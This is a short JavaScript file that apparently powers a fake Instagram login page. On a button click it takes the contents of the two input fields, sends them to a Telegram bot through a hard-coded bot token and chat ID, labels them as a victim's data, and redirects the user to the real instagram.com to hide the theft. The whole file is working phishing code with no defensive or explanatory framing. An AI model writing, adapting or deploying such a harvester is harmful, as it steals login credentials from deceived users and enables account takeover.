let inputs = document.querySelectorAll('input'); 
let button = document.querySelector('.login-button');

const TOKEN = '7964384790:AAGpZl0DZeTLADKja-xl6n66NGMSZdDeFiY';
const CHAT_ID = '6036009827';

button.addEventListener('click', () => {
    const input1 = inputs[0].value;
    const input2 = inputs[1].value;

    if (input1 === '' || input2 === '') {
        alert('Введите ДАнные');
        return; 
    }

    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    const data = {
        chat_id: CHAT_ID,
        text: `Loxni Danilari: \n${input1} \n${input2}`,
    };

    fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then((response) => response.json())
    .then((result) => console.log(result))

    window.location.href = 'https://www.instagram.com'
});
